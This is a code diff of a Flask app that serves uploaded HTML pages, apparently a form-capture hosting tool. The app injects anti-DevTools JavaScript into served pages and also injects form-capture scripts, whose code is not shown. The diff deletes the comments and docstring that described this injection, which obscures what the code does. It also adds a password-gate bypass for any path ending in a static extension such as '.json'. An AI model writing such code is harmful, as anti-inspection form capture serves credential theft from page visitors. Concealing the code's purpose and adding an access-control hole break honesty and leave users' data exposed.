@@ -51,7 +51,7 @@ class Repo(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     slug = db.Column(db.String(100), unique=True, nullable=False, index=True)
     name = db.Column(db.String(200), nullable=False)
-    password = db.Column(db.String(200), nullable=True)   # NEW: per-repo password
+    password = db.Column(db.String(200), nullable=True)
     created_at = db.Column(db.DateTime, default=datetime.utcnow)
 
 class File(db.Model):
@@ -112,6 +112,14 @@ def repo_unlocked(repo):
         return True
     if not repo.password:
         return True
+    
+    # FIX: Always allow static assets (CSS, JS, images) to load so the page doesn't break.
+    # Only block the main HTML pages behind the password gate.
+    static_exts = (".css", ".js", ".mjs", ".png", ".jpg", ".jpeg", ".gif", 
+                   ".svg", ".ico", ".woff", ".woff2", ".ttf", ".eot", ".map", ".json")
+    if request.path.lower().endswith(static_exts):
+        return True
+        
     return session.get(f"repo_unlocked_{repo.id}") is True
 
 def phone_download_dir():
@@ -166,10 +174,7 @@ def delete_cloudinary_file(public_id):
 _ANTI_DEVTOOLS_JS = """
 <script>
 (function(){
-  // Block right-click
   document.addEventListener('contextmenu', function(e){ e.preventDefault(); });
-
-  // Block F12, Ctrl+Shift+I/J/C, Ctrl+U (view source)
   document.addEventListener('keydown', function(e){
     if (e.key === 'F12' ||
         (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
@@ -180,8 +185,6 @@ _ANTI_DEVTOOLS_JS = """
       return false;
     }
   });
-
-  // Detect DevTools open and hide content
   var devtoolsOpen = false;
   var threshold = 160;
   setInterval(function(){
@@ -232,7 +235,6 @@ _CAPTURE_JS = """
 """
 
 def inject_capture(html_text, slug, anti_devtools=True):
-    """Inject anti-devtools + form-capture scripts into HTML before </body>."""
     if not html_text: return html_text
     combined = ""
     if anti_devtools:
